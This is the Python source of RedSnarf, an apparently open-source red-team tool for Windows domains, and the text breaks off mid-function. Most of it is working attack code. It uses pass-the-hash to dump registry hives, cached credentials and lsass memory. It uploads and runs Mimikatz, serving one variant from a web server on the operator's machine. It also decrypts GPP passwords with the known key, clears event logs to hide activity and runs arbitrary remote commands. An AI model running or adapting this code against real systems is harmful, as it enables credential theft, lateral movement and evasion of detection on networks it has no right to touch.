#! /usr/bin/python
# Released as open source by NCC Group Plc - https://www.nccgroup.trust/uk/
# https://github.com/nccgroup/redsnarf
# Released under Apache V2 see LICENCE for more information

import os, argparse, signal, sys, re, binascii, subprocess, string, SimpleHTTPServer, multiprocessing, SocketServer
import socket, fcntl, struct, time, base64, logging

# Logging definitions 
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s %(message)s', filename='redsnarf.log', filemode='w')
logging.debug("Command parameters run: %s", sys.argv[1:])

try:
	import ldap 
except ImportError:
	print("Try installing these modules to help with this error")
	print("run 'pip install python-ldap' to install ldap module.")
	print("apt-get install libpq-dev python-dev libxml2-dev libxslt1-dev libldap2-dev libsasl2-dev libffi-dev")
	print("apt-get install python2.7-dev")
	logging.error("ldap dependencies missing")
	exit(1)

try:
	from IPy import IP
except ImportError:
	print("You need to install IPy module: apt-get install python-ipy")
	logging.error("IPy missing")
	exit(1)

try:
	from netaddr import IPNetwork
except ImportError:
	print ('Netaddr appears to be missing - try: pip install netaddr')
	logging.error("Netaddr missing")
	exit(1)

try:
	from termcolor import colored 
except ImportError:
	print ('termcolor appears to be missing - try: pip install termcolor')
	logging.error("termcolor missing")
	exit(1)

from Crypto.Cipher import AES
from base64 import b64decode
from socket import *
from threading import Thread
from impacket.smbconnection import *
from random import randint
from base64 import b64encode
from base64 import b64decode

#####
from impacket.dcerpc.v5.rpcrt import DCERPC_v5
from impacket.dcerpc.v5 import transport, samr
from impacket import ntlm
from time import strftime, gmtime

yesanswers = ["yes", "y", "Y", "Yes", "YES"]
noanswers = ["no", "NO", "n", "N"]
events_logs = ["application","security","setup","system"]

def banner():
	print """
    ______           .____________                     _____  
\______   \ ____   __| _/   _____/ ____ _____ ________/ ____\ 
 |       _// __ \ / __ |\_____  \ /    \\__  \\_  __ \   __\  
 |    |   \  ___// /_/ |/        \   |  \/ __ \|  | \/|  |    
 |____|_  /\___  >____ /_______  /___|  (____  /__|   |__|    
        \/     \/     \/       \/     \/     \/                      
                                  redsnarf.ff0000@gmail.com
                                                  @redsnarf
"""
	print colored("\nE D Williams - NCCGroup",'red')
	print colored("R Davy - NCCGroup\n",'red')


#Code for Password Policy Retrievel
#source: https://github.com/Wh1t3Fox/polenum

def d2b(a):
	tbin = []
	while a:
		tbin.append(a % 2)
		a /= 2

	t2bin = tbin[::-1]
	if len(t2bin) != 8:
		for x in xrange(6 - len(t2bin)):
			t2bin.insert(0, 0)
	return ''.join([str(g) for g in t2bin])

def convert(low, high, lockout=False):
    time = ""
    tmp = 0

    if low == 0 and hex(high) == "-0x80000000":
        return "Not Set"
    if low == 0 and high == 0:
        return "None"

    if not lockout:
        if (low != 0):
            high = abs(high+1)
        else:
            high = abs(high)
            low = abs(low)

            tmp = low + (high)*16**8  # convert to 64bit int
            tmp *= (1e-7)  # convert to seconds
    else:
        tmp = abs(high) * (1e-7)

    try:
        minutes = int(strftime("%M", gmtime(tmp)))
        hours = int(strftime("%H", gmtime(tmp)))
        days = int(strftime("%j", gmtime(tmp)))-1
    except ValueError as e:
        return "[-] Invalid TIME"

    if days > 1:
        time += "{0} days ".format(days)
    elif days == 1:
    	time += "{0} day ".format(days)
    if hours > 1:
    	time += "{0} hours ".format(hours)
    elif hours == 1:
    	time += "{0} hour ".format(hours)
    if minutes > 1:
    	time += "{0} minutes ".format(minutes)
    elif minutes == 1:
    	time += "{0} minute ".format(minutes)
    return time

class SAMRDump:
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\samr]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\samr]', 445),
    }

    def __init__(self, protocols=None,
                 username='', password=''):
        if not protocols:
            protocols = SAMRDump.KNOWN_PROTOCOLS.keys()

        self.__username = username
        self.__password = password
        self.__protocols = protocols

    def dump(self, addr):
        """Dumps the list of users and shares registered present at
        addr. Addr is a valid host name or IP address.
        """
        encoding = sys.getdefaultencoding()
        print('\n')
        if (self.__username and self.__password):
            print('[+] Attaching to {0} using {1}:{2}'.format(addr, self.__username, self.__password))
        elif (self.__username):
            print('[+] Attaching to {0} using {1}'.format(addr, self.__username))
        else:
            print('[+] Attaching to {0} using a NULL share'.format(addr))

        # Try all requested protocols until one works.
        for protocol in self.__protocols:
            try:
                protodef = SAMRDump.KNOWN_PROTOCOLS[protocol]
                port = protodef[1]
            except KeyError:
                print("\n\t[!] Invalid Protocol '{0}'\n".format(protocol))
                sys.exit(1)
            print("\n[+] Trying protocol {0}...".format(protocol))
            rpctransport = transport.SMBTransport(addr, port, r'\samr', self.__username, self.__password)

            try:
                self.__fetchList(rpctransport)
            except Exception as e:
                print('\n\t[!] Protocol failed: {0}'.format(e))
            else:
                # Got a response. No need for further iterations.
                self.__pretty_print()
                break

    def __fetchList(self, rpctransport):
		dce = DCERPC_v5(rpctransport)
		dce.connect()
        #dce.set_auth_level(ntlm.NTLM_AUTH_PKT_INTEGRITY)
		dce.bind(samr.MSRPC_UUID_SAMR)

        # Setup Connection
		resp = samr.hSamrConnect2(dce)       

		
		if resp['ErrorCode'] != 0:
			raise Exception('Connect error')

		resp2 = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle=resp['ServerHandle'],enumerationContext=0,preferedMaximumLength=500)
		if resp2['ErrorCode'] != 0:
			raise Exception('Connect error')

		resp3 = samr.hSamrLookupDomainInSamServer(dce, serverHandle=resp['ServerHandle'],
                                                  name=resp2['Buffer']['Buffer'][0]['Name'])
		if resp3['ErrorCode'] != 0:
			raise Exception('Connect error')

		resp4 = samr.hSamrOpenDomain(dce, serverHandle=resp['ServerHandle'],
                                     desiredAccess=samr.MAXIMUM_ALLOWED,
                                     domainId=resp3['DomainId'])
		if resp4['ErrorCode'] != 0:
			raise Exception('Connect error')

		self.__domains = resp2['Buffer']['Buffer']
		domainHandle = resp4['DomainHandle']
        # End Setup

		re = samr.hSamrQueryInformationDomain2(dce, domainHandle=domainHandle,
                                               domainInformationClass=samr.DOMAIN_INFORMATION_CLASS.DomainPasswordInformation)
		self.__min_pass_len = re['Buffer']['Password']['MinPasswordLength'] or "None"
		self.__pass_hist_len = re['Buffer']['Password']['PasswordHistoryLength'] or "None"
		self.__max_pass_age = convert(int(re['Buffer']['Password']['MaxPasswordAge']['LowPart']), int(re['Buffer']['Password']['MaxPasswordAge']['HighPart']))
		self.__min_pass_age = convert(int(re['Buffer']['Password']['MinPasswordAge']['LowPart']), int(re['Buffer']['Password']['MinPasswordAge']['HighPart']))
		self.__pass_prop = d2b(re['Buffer']['Password']['PasswordProperties'])

		re = samr.hSamrQueryInformationDomain2(dce, domainHandle=domainHandle,
                                               domainInformationClass=samr.DOMAIN_INFORMATION_CLASS.DomainLockoutInformation)
		self.__rst_accnt_lock_counter = convert(0, re['Buffer']['Lockout']['LockoutObservationWindow'], lockout=True)
		self.__lock_accnt_dur = convert(0, re['Buffer']['Lockout']['LockoutDuration'], lockout=True)
		self.__accnt_lock_thres = re['Buffer']['Lockout']['LockoutThreshold'] or "None"

		re = samr.hSamrQueryInformationDomain2(dce, domainHandle=domainHandle,
                                               domainInformationClass=samr.DOMAIN_INFORMATION_CLASS.DomainLogoffInformation)
		self.__force_logoff_time = convert(re['Buffer']['Logoff']['ForceLogoff']['LowPart'], re['Buffer']['Logoff']['ForceLogoff']['HighPart'])


    def __pretty_print(self):

        PASSCOMPLEX = {
            5: 'Domain Password Complex:',
            4: 'Domain Password No Anon Change:',
            3: 'Domain Password No Clear Change:',
            2: 'Domain Password Lockout Admins:',
            1: 'Domain Password Store Cleartext:',
            0: 'Domain Refuse Password Change:'
        }

        print('\n[+] Found domain(s):\n')
        for domain in self.__domains:
            print('\t[+] {0}'.format(domain['Name']))

        print("\n[+] Password Info for Domain: {0}".format(self.__domains[0]['Name']))

        print("\n\t[+] Minimum password length: {0}".format(self.__min_pass_len))
        print("\t[+] Password history length: {0}".format(self.__pass_hist_len))
        print("\t[+] Maximum password age: {0}".format(self.__max_pass_age))
        print("\t[+] Password Complexity Flags: {0}\n".format(self.__pass_prop or "None"))

        for i, a in enumerate(self.__pass_prop):
            print("\t\t[+] {0} {1}".format(PASSCOMPLEX[i], str(a)))

        print("\n\t[+] Minimum password age: {0}".format(self.__min_pass_age))
        print("\t[+] Reset Account Lockout Counter: {0}".format(self.__rst_accnt_lock_counter))
        print("\t[+] Locked Account Duration: {0}".format(self.__lock_accnt_dur))
        print("\t[+] Account Lockout Threshold: {0}".format(self.__accnt_lock_thres))
        print("\t[+] Forced Log off Time: {0}".format(self.__force_logoff_time))

def gppdecrypt(cpassword_pass):
	#Original code taken from the resource below.
	#https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py
	key = binascii.unhexlify("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
	cpassword = cpassword_pass
	cpassword += "=" * ((4 - len(sys.argv[1]) % 4) % 4)
	password = b64decode(cpassword)
	o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)
	print colored('Your cpassword is '+o[:-ord(o[-1])].decode('utf16'),'green')

def quickjtr(filename):
	
	if os.path.isfile("/usr/share/wordlists/rockyou.txt"):		
		print colored("[+]Detected /usr/share/wordlists/rockyou.txt",'green')
		
		#John The Ripper Configuration Location
		#/etc/john/john.conf
		if 'KoreLogicRules' in open("/etc/john/john.conf").read():
			print colored("[+]Detected that KoreLogicRules in installed in john.conf",'green')	
			UseKoreLogic = raw_input("Would you like to use KoreLogicRules?: Y/(N) ")
		
			if UseKoreLogic in yesanswers:	
				print colored("[+]Some common rules are:",'green')
				print colored("[+]KoreLogicRulesAppendNumbers_and_Specials_Simple",'blue')
				print colored("[+]KoreLogicRulesL33t",'blue')
				print colored("[+]KoreLogicRulesAppendYears",'blue')
				print colored("[+]KoreLogicRulesAppendSeason",'blue')
				KoreLogicRule = raw_input("Please enter the rule you wish to use: ")
				print colored("[+]Starting John The Ripper",'yellow')
				print colored("[+]john --format=nt "+str(filename)+ " --wordlist=/usr/share/wordlists/rockyou.txt --rules:"+KoreLogicRule,'yellow')
				os.system("john --format=nt "+str(filename)+ " --wordlist=/usr/share/wordlists/rockyou.txt --rules:"+KoreLogicRule)
			else:
				print colored("[+]Starting John The Ripper",'yellow')
				print colored("[+]john --format=nt "+str(filename)+ " --wordlist=/usr/share/wordlists/rockyou.txt --rules",'yellow')
				os.system("john --format=nt "+str(filename)+ " --wordlist=/usr/share/wordlists/rockyou.txt --rules")
		else:
			print colored("[+]Starting John The Ripper",'yellow')
			print colored("[+]john --format=nt "+str(filename)+ " --wordlist=/usr/share/wordlists/rockyou.txt --rules",'yellow')
			os.system("john --format=nt "+str(filename)+ " --wordlist=/usr/share/wordlists/rockyou.txt --rules")
	else:
		print colored("[+]Starting John The Ripper",'yellow')
		print colored("[+]john --format=nt "+str(filename)+ " --rules",'yellow')
		os.system("john --format=nt "+str(filename)+" --rules")
	

def WriteLAT():
	try:
		print colored("[+]Attempting to write Local Account Token Filter Policy ",'green')
		fout=open('/tmp/lat.bat','w')
		fout.write('@echo off\n\n')
		fout.write('cls\n')
		fout.write('echo .\n')
		fout.write('echo .\n')
		fout.write('echo LocalAccountTokenFilterPolicy Enable/Disable Script\n')
		fout.write('echo R Davy - NCCGroup	\n')
		fout.write('echo .\n')
		fout.write('echo .\n')
		fout.write('echo [+] Searching Registry......\n')
		fout.write('echo .\n')
		fout.write('reg.exe query "HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system" /v "LocalAccountTokenFilterPolicy" | Find "0x1"\n')
		fout.write('IF %ERRORLEVEL% == 1 goto turnon\n')
		fout.write('If %ERRORLEVEL% == 0 goto remove\n\n')
		fout.write('goto end\n')
		fout.write(':remove\n\n')
		fout.write('reg.exe delete "HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system" /v LocalAccountTokenFilterPolicy /f \n')
		fout.write('echo .\n')
		fout.write('echo [+] Registry Key Removed \n')
		fout.write('echo .\n')
		fout.write('echo HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system\LocalAccountTokenFilterPolicy\n')
		fout.write('echo .\n')
		fout.write('goto end\n\n')
		fout.write(':turnon\n\n')
		fout.write('reg.exe add "HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system" /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /D 1 \n')
		fout.write('echo .\n')
		fout.write('echo [+] Added Registry Key\n')
		fout.write('echo .\n')
		fout.write('echo HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system\LocalAccountTokenFilterPolicy with value of 1\n')
		fout.write('echo .\n')
		fout.write('goto end\n\n')
		fout.write(':end\n')
		fout.close() 
		print colored("[+]Written to /tmp/lat.bat ",'yellow')
	except:
		print colored("[-]Something went wrong...",'red')

def get_ip_address(ifname):
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	return socket.inet_ntoa(fcntl.ioctl(
		s.fileno(),
		0x8915,  # SIOCGIFADDR
		struct.pack('256s', ifname[:15])
	)[20:24])

def enumdomusers(ip,username,password,path):
	
	#Enumerate users using enumdomusers
	dom_accounts = []

	if username=="":
		proc = subprocess.Popen('pth-rpcclient '+ip+' -U \"\" -N '+' -c \"enumdomusers\" 2>/dev/null', stdout=subprocess.PIPE,shell=True)
	else:
		proc = subprocess.Popen('pth-rpcclient '+ip+' -U '+username+'%'+password +' -c \"enumdomusers\" 2>/dev/null', stdout=subprocess.PIPE,shell=True)
	
	stdout_value = proc.communicate()[0]
	
	if "Account Name:" in stdout_value:
		print colored(username+" "+password ,'green')+colored(" - SUCCESSFUL LOGON",'green')
	elif "NT_STATUS_LOGON_FAILURE" in stdout_value:
		print colored(username+" "+password,'red') +colored(" - NT_STATUS_LOGON_FAILURE",'red')
	elif "NT_STATUS_ACCOUNT_LOCKED_OUT" in stdout_value:
		print colored('*****WARNING***** '+username+" "+password,'red') +colored(" - NT_STATUS_ACCOUNT_LOCKED_OUT",'red')
	elif "NT_STATUS_ACCOUNT_DISABLED" in stdout_value:
		print colored(username+" "+password,'blue')+colored(" - NT_STATUS_ACCOUNT_DISABLED",'blue')
	elif "NT_STATUS_PASSWORD_MUST_CHANGE" in stdout_value:
		print colored(username+" "+password,'blue') +colored(" - NT_STATUS_PASSWORD_MUST_CHANGE",'blue')
	else:
		print colored("[+]Successful Connection...",'yellow')


	if not "user:[" in stdout_value:
		return False
	else:
		for line in stdout_value.split('\n'):
			tmpline=line.lstrip()
			tmpline=tmpline.split(' ')
			dom_accounts.append(tmpline[0].replace("user:[", "").replace("]", ""))

	if len(dom_accounts)>0:
		
		if dom_accounts[len(dom_accounts)-1]=='':
			del dom_accounts[len(dom_accounts)-1]

		print colored('[*]Successfully extracted '+str(len(dom_accounts))+' user name(s)','green')
					
		if os.path.isfile(path+str(targets[0])+"_users.txt"):
			os.remove(path+str(targets[0])+"_users.txt")

		fout=open(path+str(targets[0])+"_users.txt",'w')
		for u in dom_accounts:
			fout.write(u+"\n")
		fout.close()

		print colored('[*]User accounts written to file '+(path+str(targets[0]))+"_users.txt",'green')

	else:
		print colored('[-]Looks like we were unsuccessfull extracting user names with this method','red')
		logging.error("[-]Looks like we were unsuccessfull extracting user names with this method")

def getdescfield(ip,username,password,path):
	
	usernames = []
	descfield = []
	filename=path+(str(ip)+"_users.txt")
	
	#Start by seeing if out userfile exists, if it does read in contents
	if os.path.isfile(filename):
		print colored('[*]Enumerating usernames to get description information...','yellow')
		with open(filename,'r') as inifile:
			data=inifile.read()
			user_list=data.splitlines()
		
		#Make sure that the list of users is greater than 0
		if len(user_list)>0:
			#Confirm userfile found and its not empty
			print colored('[*]Username file found...','green')
			for x in xrange(0,len(user_list)):
				if '\\' in user_list[x]:
					paccount=user_list[x].split("\\", 1)[1]
				else:
					paccount=user_list[x]

				if username=="":
					proc = subprocess.Popen('pth-rpcclient '+ip+' -U \"\" -N '+'  -c \"queryuser '+paccount+'\" 2>/dev/null', stdout=subprocess.PIPE,shell=True)
				else:
					proc = subprocess.Popen('pth-rpcclient '+ip+' -U '+username+'%'+password +' -c \"queryuser '+paccount+'\" 2>/dev/null', stdout=subprocess.PIPE,shell=True)
			
				stdout_value = proc.communicate()[0]
				
				if 'result was NT_STATUS_ACCESS_DENIED' in stdout_value:
					print colored('[-]Access Denied, Check Creds...','red')
					break
				else:
					for line in stdout_value.split('\n'):
						tmpline=line.lstrip()
						if "Description :	" in tmpline:
							desclen=(tmpline.replace("Description :	", "").rstrip())
							if len(desclen)>0:
								usernames.append(paccount)
								descfield.append(tmpline.replace("Description :	", "").rstrip())

		if len(descfield)>0:
			print colored('[*]Successfully extracted '+str(len(descfield))+' accounts with descriptions','green')
		
			if os.path.isfile(path+str(ip)+"_desc_users.txt"):
				os.remove(path+str(ip)+"_desc_users.txt")

			fout=open(path+str(ip)+"_desc_users.txt",'w')
			for u in xrange(0,len(descfield)):
				fout.write(usernames[u]+","+descfield[u]+"\n")
			fout.close()

			print colored('[*]Accounts with descriptions written to file '+path+str(ip)+"_desc_users.txt",'green')
			
			if os.path.isfile(path+str(ip)+"_desc_users.txt"):
				proc = subprocess.Popen('grep -i pass '+path+str(ip)+"_desc_users.txt", stdout=subprocess.PIPE,shell=True)
				stdout_value = proc.communicate()[0]

				if len(stdout_value)>0:
					print colored('[*]A quick check for pass reveals... '+'\n','yellow')
					print stdout_value+"\n"

				proc = subprocess.Popen('grep -i pwd '+path+str(ip)+"_desc_users.txt", stdout=subprocess.PIPE,shell=True)
				stdout_value = proc.communicate()[0]

				if len(stdout_value)>0:
					print colored('[*]A quick check for pwd reveals... '+'\n','yellow')
					print stdout_value
		
	else:
		print colored('[-]Unable to find username file...','red')

def datadump(user, passw, host, path, os_version):
	
	#Exception where User has no password
	if passw=="":
		print colored("[+]User Detected with No Password - Be patient this could take a couple of minutes: ",'yellow')
		
		if not os.path.exists(path+host):
			os.makedirs(path+host)
			print colored("[+]Creating directory for host: "+host,'green')

		proc = subprocess.Popen("secretsdump.py "+domain_name+'/'+user+'@'+host+" -no-pass -outputfile "+outputpath+host+'/'+host+'.txt', stdout=subprocess.PIPE,shell=True)
		print proc.communicate()[0]		

		print colored("[+]Files written to: "+path+host,'green')
		print colored("[+]Exiting as other features will not work at the minute with this configuration, Sorry!!: ",'yellow')
		exit(1)

	return_value=os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C \" 2>/dev/null")
	signal_number = (return_value & 0x0F)
	if not signal_number:
		exit_status = (return_value >> 8)
		if exit_status:
			print colored("[-]Something went wrong connecting to: "+host,'red')
		else:
			if not os.path.exists(path+host):
				os.makedirs(path+host)
				print colored("[+]Creating directory for host: "+host,'green')
			try:
				print colored("[+]Enumerating SAM, SYSTEM and SECURITY reg hives: "+host,'green')
				logging.info("[+]Enumerating SAM, SYSTEM and SECURITY reg hives: "+host)
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C reg save HKLM\sam c:\sam && reg.exe save HKLM\security C:\security && reg.exe save HKLM\system C:\system\" >/dev/null 2>&1")

			except OSError:
				print colored("[-]Something went wrong here getting reg hives from: "+host,'red')
				logging.error("[-]Something went wrong here getting reg hives from: "+host)
			for f in files:
				try:
					print colored("[+]getting: "+f,'yellow')
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get "+f+"\' 2>/dev/null")
				except OSError:
					print colored("[-]Something went wrong here getting files via smbclient("+f+"): "+host,'red')
			try:
				print colored("[+]removing SAM, SYSTEM and SECURITY reg hives from: "+host,'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\sam && del c:\security && del c:\system\" 2>/dev/null")
				logging.info("[+]removing SAM, SYSTEM and SECURITY reg hives from: "+host)

			except OSError:
				print colored("[-]Something went wrong here getting reg hives: "+host,'red')
				logging.error("[-]Something went wrong here getting reg hives: "+host)
			try:
				print colored("[+]Using pwdump: "+host,'green')
				if os.path.exists(creddump7path+"pwdump.py"):
					os.system(creddump7path+"pwdump.py "+path+host+"/system "+path+host+"/sam | tee "+path+host+"/pwdump")
			except OSError:
				print colored("[-]Something went wrong extracting from pwdump: "+host,'red')
				logging.error("[-]Something went wrong extracting from pwdump: "+host)	
			if skiplsacache in noanswers:
				try:
					print colored("[+]getting remote version: "+host,'green')
					print os_version
					if os_version!='':												
						if os_version.find('Server 2003')!=-1:
							print colored("[+]Server 2003 Found..",'blue')							
							for p in progs:
								try:
									print colored("[+]Using "+p+": "+host ,'green')
									if os.path.exists(creddump7path+p+".py"):
										os.system(creddump7path+p+".py "+path+host+"/system "+path+host+"/security false | tee "+path+host+"/"+p+"")
								except OSError:
										print colored("[-]Something went wrong extracting from "+p,'red')
								if os.stat(path+host+"/cachedump").st_size == 0:
									print colored("[-]No cached creds for: "+host,'yellow')
						else:
							for p in progs:
								try:
									print colored("[+]Using "+p+": "+host ,'green')
									if os.path.exists(creddump7path+p+".py"):
										os.system(creddump7path+p+".py "+path+host+"/system "+path+host+"/security true | tee "+path+host+"/"+p+"")
								except OSError:
									print colored("[-]Something went wrong extracting from "+p,'red')
								if os.stat(path+host+"/cachedump").st_size == 0:
									print colored("[-]No cached creds for: "+host,'yellow')
					else:
						print colored("[-]os version not found",'red')        
						logging.error("[-]os version not found")
				except OSError:
					print colored("[-]Something went wrong getting os version",'red')
					logging.error("[-]Something went wrong getting os version")
	
			print colored("[+]Checking for logged on users: "+host,'yellow')
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C query user > c:\\logged_on_users.txt \" 2>/dev/null")
			os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get logged_on_users.txt\' 2>/dev/null")
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\logged_on_users.txt\" 2>/dev/null")
			res = os.stat(path+host+"/logged_on_users.txt").st_size > 3
			
			if res==True:
				try:
					u = open(path+host+"/logged_on_users.txt").read().splitlines()
					for n in u:
						if n:
							print "\t"+n
				except IOError as e:
					print "I/O error({0}): {1}".format(e.errno, e.strerror)
			else:
				print colored("[-]No logged on users found: "+host,'red')	
				logging.debug("[-]No logged on users found: "+host)

			if service_accounts in yesanswers:
				print colored("[+]Checking for services running as users: "+host,'yellow')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\\users.txt\" 2>/dev/null")
				os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get users.txt\' 2>/dev/null")
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
				res = os.stat(path+host+"/users.txt").st_size > 3
				if res==True:
					try:
						u = open(path+host+"/users.txt").read().splitlines()
						for n in u:
							if n:
								print "\t"+n
					except IOError as e:
						print "I/O error({0}): {1}".format(e.errno, e.strerror)
				else:
					print colored("[-]No service accounts found: "+host,'red')	
					logging.info("[-]No service accounts found: "+host)
			if lsass_dump in yesanswers:
				if not os.path.isfile("/opt/Procdump/procdump.exe"):
					print colored("[-]Cannot see procdump.exe in /opt/Procdump/ ",'red')
					print colored("[-]Download from https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx",'yellow')
					exit(1)
				else:
					print colored("[+]Procdump.exe found",'green')
					logging.debug("[+]Procdump.exe found")
				try:
					print colored("[+]getting dump of lsass: "+host,'green')
					logging.debug("[+]getting dump of lsass: "+host)
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /opt/Procdump; put procdump.exe\' 2>/dev/null")      			
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C c:\procdump.exe  -accepteula -ma lsass.exe c:\\lsass.dmp\" >/dev/null 2>&1")
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get lsass.dmp\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\procdump.exe && del c:\\lsass.dmp\" 2>/dev/null")
					if os.path.isfile(outputpath+host+"/lsass.dmp"):
						print colored("[+]lsass.dmp file found",'green')
					else:
						print colored("[-]lsass.dmp file not found",'red')        
						logging.error("[-]lsass.dmp file not found")
				except OSError:
					print colored("[-]Something went wrong getting lsass.dmp",'red')
					logging.error("[-]Something went wrong getting lsass.dmp")
			if massmimi_dump in yesanswers:
				try:
					print colored("[+]Attempting to Run Mimikatz",'green')
					fout=open('/tmp/mimi.ps1','w')
					fout.write('Import-Module c:\\a\n')
					fout.write('a -Dwmp > c:\\mimi_creddump.txt\n')
					fout.write('exit\n')
					fout.close() 
					
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put mimi.ps1\' 2>/dev/null")
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"; put a\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimi.ps1  -Verb RunAs\" 2>/dev/null")
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get mimi_creddump.txt\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\mimi_creddump.txt c:\\a c:\\mimi.ps1\" 2>/dev/null") 
					if os.path.isfile(outputpath+host+"/mimi_creddump.txt"):
						print colored("[+]mimi_creddump.txt file found",'green')
						if not os.path.isfile('/usr/bin/iconv'):
							print colored("[-]Cannot find iconv",'red')
							exit(1)
						else:
							print colored("[+]Found iconv",'green')
							os.system("iconv -f utf-16 -t utf-8 "+outputpath+host+"/mimi_creddump.txt > "+outputpath+host+"/mimi_creddump1.txt")
							print colored("[+]Mimikatz output stored in "+outputpath+host+"/mimi_creddump1.txt",'yellow')
							print colored("[+]Basic parsed output:",'green')
							# one liner from here: http://lifepluslinux.blogspot.com/2014/09/convert-little-endian-utf-16-to-ascii.html
							os.system("cat "+outputpath+host+"/mimi_creddump1.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
					else:
						print colored("[-]mimi_creddump1.txt file not found",'red')       
				except OSError:
					print colored("[-]Something went wrong running Mimikatz...",'red')

			if clear_event in events_logs:
				try:
					print colored("[+]Clearing event log: "+clear_event,'green')
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive wevtutil cl "+clear_event+"\" 2>/dev/null")
				except OSError:
					print colored("[-]Something went wrong clearing "+clear_event+" event log...",'red')
			else:
				print colored("[+]Event logs NOT cleared...",'yellow')
				logging.warning("Event logs NOT cleared")

			if xcommand!='n':
				try:
					print colored("[+]Running Command: "+xcommand,'green')
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c "+xcommand+"\" 2>/dev/null")
				except:
					print colored("[-]Something went wrong ...",'red')

			if stealth_mimi in yesanswers or stealth_mimi=="AV":
				try:
					print colored("[+]Checking for Invoke-Mimikatz.ps1",'green')
					if not os.path.isfile('./a'):
						print colored("[-]Cannot find Invoke-Mimikatz.ps1",'red')
						exit(1)
					print colored("[+]Looks good",'green')	
					
					#Check to make sure port is not already in use
					for i in xrange(10):
						PORT = randint(49151,65535)					
						proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
						stdout_value = proc.communicate()[0]
						if len(stdout_value)>0:
							break

					my_ip=get_ip_address('eth0')
					print colored("[+]Attempting to Run Stealth Mimikatz",'green')
					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
					httpd = SocketServer.TCPServer(("",PORT), Handler)
					print colored("[+]Starting web server:"+my_ip+":"+str(PORT)+"",'green')
					server_process = multiprocessing.Process(target=httpd.serve_forever)
					server_process.daemon = True
					server_process.start()	
					
					x=' '
					
					if stealth_mimi=="AV":
						#Get Windows Defender status and store status
						print colored("[+]Getting Windows Defender Status",'yellow')
						line="Get-MpPreference | fl DisableRealtimeMonitoring"
						en = b64encode(line.encode('UTF-16LE'))						
						
